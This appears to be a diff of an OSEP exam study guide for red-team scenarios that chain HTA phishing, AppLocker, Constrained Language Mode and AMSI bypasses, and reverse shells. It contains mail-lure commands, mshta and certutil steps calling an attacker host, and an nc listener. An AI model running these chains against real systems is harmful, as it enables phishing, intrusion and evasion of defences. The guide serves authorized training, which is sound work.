@@ -6,6 +6,8 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 
 > **Covers scenarios:** 6, 7, 8
 >
+> **Course mapping:** Chapter 13 (§13.3.1–13.3.3 PowerShell CLM, custom runspaces and InstallUtil, §13.4 Bypassing AppLocker with C#, §13.5 JScript & MSHTA), Chapter 12 (§12.2–12.4 AMSI)
+>
 > **Prerequisites:** HTTP service on the attacker reachable from the target (Kali `python3 -m http.server` is enough); a Windows environment that can compile .NET Framework (any Win10 on the lab net or your own Windows VM, to produce `m02-clm-bypass-runspace.exe`); mail delivery path (swaks/sendEmail; see scenario 6).
 
 **How the three scenarios relate**: Scenario 6 is “HTA as first stage; target has AppLocker, no Office.” Scenario 7 is “AppLocker + CLM + AMSI all on,” so you must **combine** HTA, an InstallUtil-compatible assembly, a custom Runspace, AMSI handling, and a stage-2 Runner and verify the full chain. Scenario 8 is **timing/lifecycle triage** when “download+execute in one command fails, but split works” — do not blame AV first. All three share the same files; differences are combination and triage order.
@@ -28,9 +30,9 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
    python3 -m http.server 80     # or 8080; put the full URL in the mail
    nc -lvnp LPORT                # stage-2 reverse listener
    ```
-2. Pre-prepare stage-2 script `shell.ps1` (stable TCP reverse; see cheat sheet `C# for CLM Bypass with PS Script` shell.ps1 template; usable as-is when scenario 6 has no CLM). Replace `[ATTACKER_IP]`/`[PORT]` with `LHOST`/`LPORT` and place it at the web root.
+2. Pre-prepare stage-2 script `shell.ps1` (stable TCP reverse; see quick-reference notes `C# for CLM Bypass with PS Script` shell.ps1 template; usable as-is when scenario 6 has no CLM). Replace `[ATTACKER_IP]`/`[PORT]` with `LHOST`/`LPORT` and place it at the web root.
 3. Pre-compile **both x86 and x64** InstallUtil-compatible runners (`m02-clm-bypass-runspace.cs`) using scenario 7’s method — this scenario’s fallback.
-4. Mail delivery (cheat sheet `HTA` section; URL form beats attachments — attachments are often filtered):
+4. Mail delivery (quick-reference notes `HTA` section; URL form beats attachments — attachments are often filtered):
    ```bash
    # Send a "link" lure (recommended): HTA at web root; body only gives http://LHOST/stager.hta
    swaks --body 'Please click here http://LHOST/stager.hta' \
@@ -406,7 +408,7 @@ Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync wh
 **Failure branches and alternatives**:
 - If `mshta.exe` is denied by AppLocker (policy tightened even for System32) → switch to `cscript/wscript` JScript (see M03 scenarios 9–10), or another signed host allowed by default.
 - If `.hta` attachments are filtered by the mail gateway → send only a link with HTA at the web root; or lure with a shortcut that runs `C:\Windows\System32\mshta.exe http://LHOST/stager.hta`.
-- If `DownloadString` is blocked (AMSI/Defender scanning IEX content) → run `Disable AMSI` first (same cheat sheet section) then IEX, or jump straight to scenario 7’s combined chain.
+- If `DownloadString` is blocked (AMSI/Defender scanning IEX content) → run `Disable AMSI` first (same quick-reference notes section) then IEX, or jump straight to scenario 7’s combined chain.
 - If egress is proxy-only → in shell.ps1 set `[System.Net.WebRequest]::DefaultWebProxy` explicitly (see M09 scenario 28).
 
 **Exam / OPSEC notes**: HTA flashes a desktop window — use `<HTA:APPLICATION ... WINDOWSTATE="minimize">` and `self.close()` at the end so it does not sit in front of the user; keep real attacker domains out of the mail body and use business-looking lures; run the harmless callback before any payload so you do not burn a whole mail round on a dead entry.
@@ -420,7 +422,7 @@ Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync wh
 **Assumptions**: AppLocker default rules allow signed System32 programs: `mshta.exe`, `powershell.exe` (but enters CLM), `csc.exe`, `InstallUtil.exe`; script files (`.ps1`) are limited by script rules/language mode so you cannot just `powershell -File`. Custom Runspace is the key: a non-powershell.exe process (the .NET program hosted by InstallUtil) creates `System.Management.Automation.Runspaces`; that engine runs in FullLanguage and is not bound by AppLocker script rules.
 
 **Prepare (attacker side)**:
-1. Improved `shell.ps1`: in the cheat sheet reverse template (`C# for CLM Bypass with PS Script` section) **insert AMSI handling on the first line** (`amsiInitFailed` reflection works under FullLanguage), then the reverse code; replace `LHOST/LPORT`. Host at the web root.
+1. Improved `shell.ps1`: in the quick-reference notes reverse template (`C# for CLM Bypass with PS Script` section) **insert AMSI handling on the first line** (`amsiInitFailed` reflection works under FullLanguage), then the reverse code; replace `LHOST/LPORT`. Host at the web root.
 2. On a Windows build host produce runners (x64 and x86 each):
    ```bat
    :: x64 (preferred on 64-bit targets)
@@ -434,12 +436,12 @@ Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync wh
      /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
      m02-clm-bypass-runspace.cs
    ```
-   If `/r:System.Management.Automation.dll` fails to resolve, reference the full GAC path: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\System.Management.Automation.dll`. Also add a `System.Configuration.Install` reference (cheat sheet notes VS often misses it).
-3. Optional: `certutil -encode m02stage64.exe enc.txt` so the runner can travel as text through mail/download (decode on target with `certutil -decode`; see cheat sheet steps).
+   If `/r:System.Management.Automation.dll` fails to resolve, reference the full GAC path: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\System.Management.Automation.dll`. Also add a `System.Configuration.Install` reference (quick-reference notes notes VS often misses it).
+3. Optional: `certutil -encode m02stage64.exe enc.txt` so the runner can travel as text through mail/download (decode on target with `certutil -decode`; see quick-reference notes steps).
 4. Place exe/enc.txt and shell.ps1 at the Kali web root; start `python3 -m http.server` and `nc -lvnp LPORT`.
 
 **Procedure**:
-1. Recon that all three are present (`m00-recon-defenses.ps1`): effective AppLocker rules, language mode `ConstrainedLanguage`, whether `amsi.dll` is in the process (cheat sheet `Enumerate Defenses` / `Disable AMSI`). Only then is this chain worth running.
+1. Recon that all three are present (`m00-recon-defenses.ps1`): effective AppLocker rules, language mode `ConstrainedLanguage`, whether `amsi.dll` is in the process (quick-reference notes `Enumerate Defenses` / `Disable AMSI`). Only then is this chain worth running.
 2. First run `m02-hta-callback.hta` to confirm the mshta host itself is not blocked by policy/AV by process name (callback `GET /cb` is enough).
 3. Use `m02-hta-embedded-clm-bypass.hta` (single file: embedded C# + on-target csc + InstallUtil /U) or manually run the equivalent “download→decode→InstallUtil” chain:
    ```
@@ -627,7 +629,7 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 - If the AMSI-handling line itself is blocked (`AmsiUtils` string is a signature) → switch to other reflection styles from the `Disable AMSI` section or string-split concatenation; keep host-process bitness matched.
 - If on the real target “each link works alone, chained together does nothing” → triage timing per scenario 8; do not assume AV.
 
-**Exam / OPSEC notes**: the three-piece combined chain **must be walked end-to-end on the lab net** before the exam — order, bitness, missing references, InstallUtil paths that were never verified are time sinks; keep x64/x86 copies of runner and shell.ps1 and pick by measured target; avoid large Meterpreter payloads — simple TCP reverse + AMSI handling is most stable (cheat sheet notes some samples fail with AMSI on); HTA still flashes briefly — minimize + immediate `self.close()`.
+**Exam / OPSEC notes**: the three-piece combined chain **must be walked end-to-end on the lab net** before the exam — order, bitness, missing references, InstallUtil paths that were never verified are time sinks; keep x64/x86 copies of runner and shell.ps1 and pick by measured target; avoid large Meterpreter payloads — simple TCP reverse + AMSI handling is most stable (quick-reference notes notes some samples fail with AMSI on); HTA still flashes briefly — minimize + immediate `self.close()`.
 
 ---
 
